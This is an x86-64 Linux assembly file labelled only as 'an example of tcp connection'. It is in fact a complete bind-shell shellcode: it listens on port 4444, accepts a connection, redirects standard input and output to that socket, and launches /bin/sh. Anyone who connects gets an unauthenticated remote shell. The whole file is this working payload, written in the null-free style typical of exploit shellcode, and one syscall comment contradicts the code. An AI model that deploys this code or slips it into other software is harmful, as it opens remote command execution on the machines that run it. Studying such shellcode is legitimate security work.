; tcp-bind.asm - An example of tcp connection
	global _start
_start:
	; sock = socket(AF_INET, SOCK_STREAM, 0)
	xor rax, rax
	add rax, 41				; socket syscall 42
	xor rdi, rdi
	add rdi, 2				; AF_INET = 2
	xor rsi, rsi
	inc rsi					; SOCK_STREAM = 1
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use
	mov rdi, rax

	xor rax, rax
	push rax

	; server.sin_family = AF_INET;
	; server.sin_port = htons(atoi(argv[1]));
	; server.sin_addr.s_addr = INADDR_ANY;
	; bzero(&server.sin_zero, 8);

	mov dword [rsp - 4], eax		
	mov word [rsp - 6], 0x5c11		; htons(atoi(argv[1]))  
	add word [rsp - 8], 0x2
	sub rsp, 8

	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; bind syscall 49
	xor rax, rax
	add rax, 49
	xor rsi, rsi
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall

	; listen(sock, MAX_CLIENTS)
	; syscall number 50
	xor rax, rax
	add rax, 50
	add rsi, 2
	syscall

	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	  ; syscall number 43
	xor rax, rax
	add rax, 43
	sub rsp, 16
	mov rsi, rsp
	mov byte[rsp -  1], 16
	sub rsp, 1
	mov rdx, rsp
	syscall

	; store the client socket description
	mov r9, rax

	; close parent
	xor rax, rax
	add rax, 3
	syscall

	; duplicate sockets
	; dup2(new, old)
	mov rdi, r9
	xor rax, rax
	add rax, 33
	xor rsi, rsi
	syscall

	xor rax, rax
	add rax, 33
	inc rsi
	syscall

	xor rax, rax
	add rax, 33
	inc rsi
	syscall

	;execve
	; push NULL
	xor rax, rax
	push rax

	; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh addres in RDI
	mov rdi, rsp

	; second NULL push 
	push rax

	;set RDX
	mov rdx, rsp

	;push address of /bin//sh
	push rdi

	; set RSI
	mov rsi, rsp

	; call the exevce syscall
	add rax, 59
	syscall
